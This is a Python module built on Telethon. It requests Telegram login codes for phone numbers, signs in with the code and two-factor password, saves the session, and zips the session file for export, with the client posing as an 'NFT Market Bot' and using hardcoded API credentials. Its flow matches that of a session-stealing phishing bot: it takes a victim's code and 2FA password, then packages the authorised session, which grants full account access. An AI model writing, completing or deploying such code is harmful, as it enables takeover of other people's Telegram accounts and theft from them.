import asyncio
import os
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

API_ID = int(os.environ.get("API_ID", "30205421"))
API_HASH = os.environ.get("API_HASH", "410de2c0ba6d0915000a16961cea2229")

os.makedirs('sessions', exist_ok=True)

async def send_code(phone: str):
    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH,
        device_model='NFT Market Bot',
        system_version='1.0',
        app_version='1.0',
        lang_code='ru',
    )
    await client.connect()
    result = await client.send_code_request(phone)
    await client.disconnect()
    return result.phone_code_hash

async def sign_in(phone: str, code: str, phone_code_hash: str, password: str = None):
    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH,
        device_model='NFT Market Bot',
        system_version='1.0',
        app_version='1.0',
        lang_code='ru',
    )
    await client.connect()
    try:
        if code:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        if password:
            await client.sign_in(password=password)
    except SessionPasswordNeededError:
        if password:
            await client.sign_in(password=password)
        else:
            await client.disconnect()
            raise Exception("2FA required")
    await client.disconnect()
    return True

async def export_tdata(phone: str):
    try:
        import io, zipfile
        session_path = f'sessions/{phone}.session'
        
        if not os.path.exists(session_path):
            print(f'Session file not found: {session_path}')
            return None

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(session_path, f'{phone}.session')
        zip_buffer.seek(0)
        return zip_buffer.read()

    except Exception as e:
        print(f'session zip error: {e}')
        return None